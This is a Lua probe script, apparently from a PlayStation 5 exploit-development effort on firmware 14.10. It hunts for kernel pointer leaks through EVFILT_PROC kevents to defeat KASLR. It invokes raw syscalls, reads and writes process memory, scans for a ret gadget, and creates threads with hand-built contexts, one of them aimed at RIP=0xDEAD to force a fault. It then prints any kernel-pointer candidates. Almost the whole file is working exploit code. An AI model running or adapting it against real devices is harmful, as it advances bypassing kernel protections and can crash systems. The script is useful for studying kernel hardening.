-- CRASH_CLASS: MODERATE (section C creates a faulting thread)
-- PROBE 170a: EVFILT_PROC kevent KASLR leak hunt
-- EVFILT_PROC (filter -5) has NEVER been tested on 14.10.
-- On older FreeBSD, kn_data/kn_fflags can contain struct thread* or trap frame addresses.
-- Sections:
--   A: Register EVFILT_PROC on own PID, immediate poll → scan for kernel pointers
--   B: Register EVFILT_PROC with NOTE_EXIT|NOTE_FORK|NOTE_EXEC, create child thread that exits → poll
--   C: Register EVFILT_PROC, thr_create with RIP=0xDEAD (fault) → poll before death

print("=== PROBE 170a: EVFILT_PROC KASLR LEAK HUNT ===")
print("")

----------------------------------------------------------------
-- helpers
----------------------------------------------------------------
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) memory.write_dword(addr, val) end
local function wq(addr, val) memory.write_qword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end
local function rq(addr) return memory.read_qword(addr) end
local function zero(buf, n) for off = 0, n - 4, 4 do wd(buf + off, 0) end end

local function is_kptr(hi)
    return hi >= 0xFFFF8000 and hi <= 0xFFFFFFFE
end

local function dump_kevent(base, label)
    -- kevent struct: uint64 ident, int16 filter, uint16 flags, uint32 fflags, int64 data, void* udata
    local ident = rq(base)
    local filter_flags = rd(base + 8)   -- filter(lo16) | flags(hi16)
    local fflags = rd(base + 12)
    local data = rq(base + 16)
    local udata = rq(base + 24)
    local filter = bit32.band(filter_flags, 0xFFFF)
    local flags  = bit32.rshift(filter_flags, 16)
    -- sign-extend filter
    if filter >= 0x8000 then filter = filter - 0x10000 end
    print(string.format("  %s ident=%s filter=%d flags=0x%04X fflags=0x%08X",
        label, q(ident), filter, flags, fflags))
    print(string.format("  %s data=%s udata=%s", label, q(data), q(udata)))
    -- raw dword dump
    for off = 0, 28, 4 do
        print(string.format("  %s +0x%02X = 0x%08X", label, off, rd(base + off)))
    end
    -- scan all qword fields for kernel pointers
    local found = 0
    for _, info in ipairs({{0,"ident"},{16,"data"},{24,"udata"}}) do
        local off, name = info[1], info[2]
        local v = rq(base + off)
        local h, l = get_hi_lo(v)
        if is_kptr(h) then
            print(string.format("  *** KPTR_CANDIDATE in %s: %s ***", name, q(v)))
            found = found + 1
        end
    end
    -- also check fflags as upper 32-bit of a potential 64-bit value
    if fflags >= 0xFFFF8000 then
        print(string.format("  *** KPTR_CANDIDATE in fflags upper: 0x%08X ***", fflags))
        found = found + 1
    end
    return found
end

----------------------------------------------------------------
-- syscalls
----------------------------------------------------------------
local sc_kqueue     = make_syscall(362)
local sc_kevent     = make_syscall(363)
local sc_getpid     = make_syscall(20)
local sc_thr_self   = make_syscall(432)
local sc_thr_create = make_syscall(430)
local sc_thr_kill   = make_syscall(433)
local sc_nanosleep  = make_syscall(240)
local sc_mmap       = make_syscall(477)
local sc_close      = make_syscall(6)

----------------------------------------------------------------
-- constants
----------------------------------------------------------------
local EVFILT_PROC   = 0xFFFB  -- -5 as uint16
local EV_ADD        = 0x0001
local EV_ENABLE     = 0x0004
local EV_ONESHOT    = 0x0010
local EV_CLEAR      = 0x0020
local NOTE_EXIT     = 0x80000000
local NOTE_FORK     = 0x40000000
local NOTE_EXEC     = 0x20000000
local NOTE_TRACK    = 0x00000001

local pid = to_num(sc_getpid())
print("pid=" .. pid)

-- shared buffers
local changelist = memory.alloc(64)   -- room for 2 kevent structs
local eventlist  = memory.alloc(256)  -- room for 8 kevent results
local timeout    = memory.alloc(16)
wq(timeout, uint64(0))               -- tv_sec = 0
wq(timeout + 8, uint64(0))           -- tv_nsec = 0

local total_kptrs = 0

----------------------------------------------------------------
-- helper: pack a changelist kevent at addr
----------------------------------------------------------------
local function pack_kevent(addr, ident, filter_u16, flags_u16, fflags_u32, data, udata)
    wq(addr, uint64(ident))
    -- filter(lo16) | flags(hi16) packed as a dword
    wd(addr + 8, bit32.bor(filter_u16, bit32.lshift(flags_u16, 16)))
    wd(addr + 12, fflags_u32)
    wq(addr + 16, uint64(data))
    wq(addr + 24, uint64(udata))
end

----------------------------------------------------------------
-- SECTION A: immediate poll on own PID
----------------------------------------------------------------
print("")
print("=== SECTION A: EVFILT_PROC immediate poll on own PID ===")
local ok_a, err_a = pcall(function()
    local kq = to_num(sc_kqueue())
    print("  kq=" .. kq)
    if kq < 0 then print("  kqueue failed"); return end

    -- register EVFILT_PROC on our PID with all interesting notes
    pack_kevent(changelist, pid, EVFILT_PROC,
        bit32.bor(EV_ADD, EV_ENABLE, EV_ONESHOT),
        bit32.bor(NOTE_EXIT, NOTE_FORK, NOTE_EXEC, NOTE_TRACK),
        0, 0xAAAAAAAA)

    zero(eventlist, 256)

    local ret = to_num(sc_kevent(uint64(kq), uint64(changelist), uint64(1),
        uint64(eventlist), uint64(4), uint64(timeout)))
    print("  kevent returned n=" .. ret)
    if ret > 0 then
        for ev = 0, math.min(ret - 1, 3) do
            local k = dump_kevent(eventlist + ev * 32, string.format("A.ev%d", ev))
            total_kptrs = total_kptrs + k
        end
    elseif ret == 0 then
        print("  no events (expected — no proc event pending)")
    else
        print("  kevent error ret=" .. ret)
    end

    -- Check: even if no events came back, the registration itself may have
    -- returned an EV_ERROR event. Scan raw bytes.
    if ret == 0 then
        print("  [A raw scan of eventlist for non-zero bytes]")
        local nonzero = 0
        for off = 0, 127, 4 do
            local d = rd(eventlist + off)
            if d ~= 0 then
                print(string.format("    +0x%02X = 0x%08X", off, d))
                nonzero = nonzero + 1
            end
        end
        if nonzero == 0 then print("    (all zero)") end
    end

    sc_close(uint64(kq))
end)
if not ok_a then print("  SECTION A pcall error: " .. tostring(err_a)) end

----------------------------------------------------------------
-- SECTION B: child thread exit event
----------------------------------------------------------------
print("")
print("=== SECTION B: EVFILT_PROC + child thread exit event ===")
local ok_b, err_b = pcall(function()
    local kq = to_num(sc_kqueue())
    print("  kq=" .. kq)
    if kq < 0 then print("  kqueue failed"); return end

    -- register EVFILT_PROC on our PID for NOTE_EXIT|NOTE_FORK
    pack_kevent(changelist, pid, EVFILT_PROC,
        bit32.bor(EV_ADD, EV_ENABLE, EV_CLEAR),
        bit32.bor(NOTE_EXIT, NOTE_FORK, NOTE_EXEC),
        0, 0xBBBBBBBB)

    local reg_ret = to_num(sc_kevent(uint64(kq), uint64(changelist), uint64(1),
        uint64(0), uint64(0), uint64(0)))
    print("  registration ret=" .. reg_ret)

    -- Create a child thread that immediately returns (RIP = ret gadget)
    -- First find a 'ret' (0xC3) in low memory via module info
    local info = memory.alloc(0x200)
    zero(info, 0x200)
    wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local text_lo = rd(info + 0x108)
    local text_hi = rd(info + 0x10C)
    local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
    print("  eboot_base=" .. q(eboot_base))

    -- scan for 0xC3 (ret)
    local ret_gadget = nil
    for off = 0, 0x10000 do
        local ok_r, b = pcall(function() return to_num(memory.read_byte(eboot_base + off)) end)
        if ok_r and b == 0xC3 then
            ret_gadget = eboot_base + off
            break
        end
    end
    if not ret_gadget then
        print("  no ret gadget found, skipping thread creation")
        sc_close(uint64(kq))
        return
    end
    print("  ret_gadget=" .. q(ret_gadget))

    -- allocate stack for child
    local child_stack = memory.alloc(0x4000)
    zero(child_stack, 0x4000)
    local stack_top = child_stack + 0x4000 - 0x100

    -- build ucontext for thr_create
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    -- mcontext offsets (PS5 14.10, differ from FreeBSD by -0x10)
    local C_MAGIC = 0x108
    local C_FLAGS = 0x0D0
    local C_TYPE  = 0x110
    local C_CS    = 0x0C0
    local C_RIP   = 0x0E0
    local C_RSP   = 0x0F8
    local C_SS    = 0x100
    wq(ctx + C_MAGIC, uint64(0x480))
    wd(ctx + C_FLAGS, 0)
    wq(ctx + C_TYPE, uint64(0x10000))
    wq(ctx + C_CS, uint64(0x43))
    wq(ctx + C_SS, uint64(0x3B))
    wq(ctx + C_RIP, ret_gadget)
    wq(ctx + C_RSP, stack_top)

    local tid_buf = memory.alloc(8)
    zero(tid_buf, 8)

    print("  creating child thread (will ret immediately)...")
    local ok_tc, rv_tc = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
    end)
    local child_tid = rq(tid_buf)
    print("  thr_create ok=" .. tostring(ok_tc) .. " rv=" .. tostring(to_num(rv_tc))
        .. " child_tid=" .. q(child_tid))

    -- small sleep to let the child exit
    local ts = memory.alloc(16)
    wq(ts, uint64(0))
    wq(ts + 8, uint64(200000000))  -- 200ms
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

    -- poll for events
    zero(eventlist, 256)
    wq(timeout, uint64(0))
    wq(timeout + 8, uint64(0))
    local poll_ret = to_num(sc_kevent(uint64(kq), uint64(0), uint64(0),
        uint64(eventlist), uint64(8), uint64(timeout)))
    print("  kevent poll returned n=" .. poll_ret)

    if poll_ret > 0 then
        for ev = 0, math.min(poll_ret - 1, 7) do
            local k = dump_kevent(eventlist + ev * 32, string.format("B.ev%d", ev))
            total_kptrs = total_kptrs + k
        end
    else
        print("  no events returned")
        -- raw scan
        local nonzero = 0
        for off = 0, 255, 4 do
            local d = rd(eventlist + off)
            if d ~= 0 then
                print(string.format("    +0x%02X = 0x%08X", off, d))
                nonzero = nonzero + 1
            end
        end
        if nonzero == 0 then print("    (all zero)") end
    end

    -- check if child is still alive
    local ok_ck, rv_ck = pcall(function() return sc_thr_kill(child_tid, uint64(0)) end)
    print("  thr_kill(child,0) rv=" .. tostring(to_num(rv_ck)) ..
        " (0=alive, -1=dead)")

    sc_close(uint64(kq))
end)
if not ok_b then print("  SECTION B pcall error: " .. tostring(err_b)) end

----------------------------------------------------------------
-- SECTION C: faulting thread trap frame leak
----------------------------------------------------------------
print("")
print("=== SECTION C: EVFILT_PROC + faulting thread (trap frame leak) ===")
local ok_c, err_c = pcall(function()
    local kq = to_num(sc_kqueue())
    print("  kq=" .. kq)
    if kq < 0 then print("  kqueue failed"); return end

    -- register EVFILT_PROC on our PID for NOTE_EXIT (thread exit from fault)
    pack_kevent(changelist, pid, EVFILT_PROC,
        bit32.bor(EV_ADD, EV_ENABLE, EV_CLEAR),
        bit32.bor(NOTE_EXIT, NOTE_FORK, NOTE_EXEC),
        0, 0xCCCCCCCC)

    local reg_ret = to_num(sc_kevent(uint64(kq), uint64(changelist), uint64(1),
        uint64(0), uint64(0), uint64(0)))
    print("  registration ret=" .. reg_ret)

    -- build ucontext with RIP=0xDEAD (will fault immediately)
    local C_MAGIC = 0x108
    local C_FLAGS = 0x0D0
    local C_TYPE  = 0x110
    local C_CS    = 0x0C0
    local C_RIP   = 0x0E0
    local C_RSP   = 0x0F8
    local C_SS    = 0x100

    local child_stack = memory.alloc(0x4000)
    zero(child_stack, 0x4000)
    local stack_top = child_stack + 0x4000 - 0x100

    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx + C_MAGIC, uint64(0x480))
    wd(ctx + C_FLAGS, 0)
    wq(ctx + C_TYPE, uint64(0x10000))
    wq(ctx + C_CS, uint64(0x43))
    wq(ctx + C_SS, uint64(0x3B))
    wq(ctx + C_RIP, uint64(0xDEAD))  -- intentional fault address
    wq(ctx + C_RSP, stack_top)

    local tid_buf = memory.alloc(8)
    zero(tid_buf, 8)

    print("  creating faulting child thread (RIP=0xDEAD)...")
    local ok_tc, rv_tc = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
    end)
    local child_tid = rq(tid_buf)
    print("  thr_create ok=" .. tostring(ok_tc) .. " rv=" .. tostring(to_num(rv_tc))
        .. " child_tid=" .. q(child_tid))

    -- very short sleep — we want to poll BEFORE process cleanup, but after the fault
    local ts = memory.alloc(16)
    wq(ts, uint64(0))
    wq(ts + 8, uint64(50000000))  -- 50ms
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

    -- poll for events
    zero(eventlist, 256)
    wq(timeout, uint64(0))
    wq(timeout + 8, uint64(0))
    local poll_ret = to_num(sc_kevent(uint64(kq), uint64(0), uint64(0),
        uint64(eventlist), uint64(8), uint64(timeout)))
    print("  kevent poll returned n=" .. poll_ret)

    if poll_ret > 0 then
        for ev = 0, math.min(poll_ret - 1, 7) do
            local k = dump_kevent(eventlist + ev * 32, string.format("C.ev%d", ev))
            total_kptrs = total_kptrs + k
        end
    else
        print("  no events returned")
        -- raw scan
        local nonzero = 0
        for off = 0, 255, 4 do
            local d = rd(eventlist + off)
            if d ~= 0 then
                print(string.format("    +0x%02X = 0x%08X", off, d))
                nonzero = nonzero + 1
            end
        end
        if nonzero == 0 then print("    (all zero)") end
    end

    -- try a longer wait and re-poll (fault delivery may be async)
    wq(ts, uint64(0))
    wq(ts + 8, uint64(300000000))  -- 300ms
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

    zero(eventlist, 256)
    wq(timeout, uint64(0))
    wq(timeout + 8, uint64(0))
    local poll2_ret = to_num(sc_kevent(uint64(kq), uint64(0), uint64(0),
        uint64(eventlist), uint64(8), uint64(timeout)))
    print("  kevent re-poll (after 300ms) n=" .. poll2_ret)
    if poll2_ret > 0 then
        for ev = 0, math.min(poll2_ret - 1, 7) do
            local k = dump_kevent(eventlist + ev * 32, string.format("C2.ev%d", ev))
            total_kptrs = total_kptrs + k
        end
    end

    -- check if child is still alive
    local ok_ck, rv_ck = pcall(function() return sc_thr_kill(child_tid, uint64(0)) end)
    print("  thr_kill(child,0) rv=" .. tostring(to_num(rv_ck))
        .. " (0=alive, -1/ESRCH=dead)")

    sc_close(uint64(kq))
end)
if not ok_c then print("  SECTION C pcall error: " .. tostring(err_c)) end

----------------------------------------------------------------
-- SUMMARY
----------------------------------------------------------------
print("")
print("=== PROBE 170a SUMMARY ===")
print("total KPTR_CANDIDATE values found: " .. total_kptrs)
if total_kptrs > 0 then
    print("RESULT: EVFILT_PROC LEAKS KERNEL POINTERS — KASLR DEFEAT CANDIDATE")
else
    print("RESULT: no kernel pointer leak detected via EVFILT_PROC")
end
print("=== PROBE 170a COMPLETE ===")
